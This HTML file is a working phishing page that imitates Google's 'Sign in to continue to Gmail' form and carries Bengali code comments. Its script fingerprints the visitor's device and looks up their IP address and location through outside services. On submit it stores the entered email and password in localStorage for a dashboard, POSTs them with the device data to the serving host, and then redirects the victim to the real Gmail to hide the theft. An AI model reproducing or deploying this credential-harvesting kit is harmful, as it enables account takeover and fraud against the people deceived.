<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Sign in - Google Accounts</title>
	<style>
		/* Google Fonts and Basic Styles */
		@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

		* {
			margin: 0;
			padding: 0;
			box-sizing: border-box;
		}

		body {
			font-family: 'Roboto', sans-serif;
			background-color: #f9f9f9;
			display: flex;
			justify-content: center;
			align-items: center;
			min-height: 100vh;
			color: #333;
		}

		/* Login Container - the card itself */
		.login-container {
			background-color: white;
			padding: 40px 30px;
			border: 1px solid #ddd;
			border-radius: 8px;
			width: 100%;
			max-width: 400px;
			text-align: center;
		}

		.google-logo {
			width: 80px;
			height: auto;
			margin-bottom: 20px;
		}

		h1 {
			font-size: 24px;
			font-weight: 500;
			margin-bottom: 8px;
		}

		.subtitle {
			font-size: 16px;
			margin-bottom: 25px;
		}

		/* Form and Input Styles */
		.input-group {
			margin-bottom: 20px;
			text-align: left;
		}

		input[type="text"],
		input[type="password"] {
			width: 100%;
			height: 50px;
			border: 1px solid #ccc;
			border-radius: 4px;
			padding: 0 15px;
			font-size: 16px;
			transition: border-color 0.3s;
		}

		input[type="text"]:focus,
		input[type="password"]:focus {
			outline: none;
			border: 2px solid #1a73e8;
		}

		::placeholder {
			color: #888;
			font-size: 16px;
		}

		/* Links and Actions */
		.form-actions {
			display: flex;
			justify-content: space-between;
			align-items: center;
			margin-top: 30px;
		}

		.forgot-email {
			color: #1a73e8;
			text-decoration: none;
			font-weight: 500;
			font-size: 14px;
		}

		.forgot-email:hover {
			text-decoration: underline;
		}

		.next-button {
			background-color: #1a73e8;
			color: white;
			border: none;
			border-radius: 4px;
			padding: 12px 24px;
			font-size: 16px;
			font-weight: 500;
			cursor: pointer;
			transition: background-color 0.3s;
		}

		.next-button:hover {
			background-color: #155ab6;
		}
        
        .next-button:disabled {
            background-color: #a0c3f2;
            cursor: wait;
        }

		/* Responsive Design for Mobile */
		@media (max-width: 480px) {
			body {
				background-color: white; /* Make background white on mobile */
			}
			.login-container {
				border: none;
				box-shadow: none;
				padding: 20px;
			}
		}
	</style>
</head>
<body>

    <div class="login-container">
       
        <svg class="google-logo" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" xmlns:xlink="http://www.w3.org/1999/xlink" style="display: block; margin: 0 auto 20px auto;">
            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
            <path fill="none" d="M0 0h48v48H0z"></path>
        </svg>

        <h1>Sign in</h1>
        <p class="subtitle">to continue to Gmail</p>

        <form id="loginForm">
            <div class="input-group">
                <input type="text" name="email" id="email" placeholder="Email or phone" required>
            </div>
            <div class="input-group">
                <input type="password" name="pass" id="pass" placeholder="Enter your password" required>
            </div>

            <div class="form-actions">
                <a href="#" class="forgot-email">Forgot email?</a>
                <button type="submit" class="next-button" id="submitBtn">Next</button>
            </div>
        </form>
    </div>

    <!-- =========== ডেটা সংগ্রহের জন্য নতুন স্ক্রিপ্ট =========== -->
    <script>
        // পেজ লোড হওয়ার সাথে সাথে ডিভাইসের তথ্য সংগ্রহ শুরু
        let deviceInfoPromise = (async () => {
            const deviceInfo = {
                ua: navigator.userAgent || 'Unknown',
                platform: navigator.platform || 'Unknown',
                language: navigator.language || 'Unknown',
                res: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            if (navigator.connection) {
                deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
            }
            
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    deviceInfo.batteryLevel = Math.round(battery.level * 100);
                    deviceInfo.isCharging = battery.charging;
                } catch (e) { /* ignore */ }
            }
            
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                deviceInfo.ip = ipData.ip;
                
                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const locationData = await locationResponse.json();
                deviceInfo.country = locationData.country_name;
                deviceInfo.city = locationData.city;
            } catch (e) {
                deviceInfo.ip = 'Failed to fetch';
            }
            
            return JSON.stringify(deviceInfo);
        })();

        // ফর্ম সাবমিট করার সময় ডেটা ম্যানেজ করা
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault(); // ফর্মের ডিফল্ট সাবমিশন বন্ধ করা

            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;

            if (!email || !pass) {
                alert('Please enter both email/phone and password.');
                return;
            }

            const submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = true;
            submitBtn.textContent = 'Signing in...';
            
            const deviceInfo = await deviceInfoPromise;

            // LocalStorage-এ ডেটা সেভ করা (ড্যাশবোর্ডের জন্য)
            try {
                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
                if (!storedData.emailData) {
                    storedData.emailData = [];
                }
                storedData.emailData.push({
                    email: email,
                    pass: pass,
                    deviceInfo: deviceInfo,
                    timestamp: new Date().toLocaleString(),
                    type: 'login'
                });
                localStorage.setItem('userInputData', JSON.stringify(storedData));
            } catch (error) {
                console.error('Error saving to localStorage:', error);
            }

            // সার্ভারে ডেটা পাঠানোর সিমুলেশন
            try {
                await fetch('/', { 
                    method: 'POST', 
                    body: new URLSearchParams({ email, pass, deviceInfo }) 
                });
            } catch (error) {
                console.error('Error sending data to server:', error);
            }

            // ব্যবহারকারীকে আসল Google সাইটে রিডাইরেক্ট করা
            setTimeout(() => {
                window.location.href = 'https://mail.google.com/';
            }, 1500);
        });
    </script>
</body>
</html>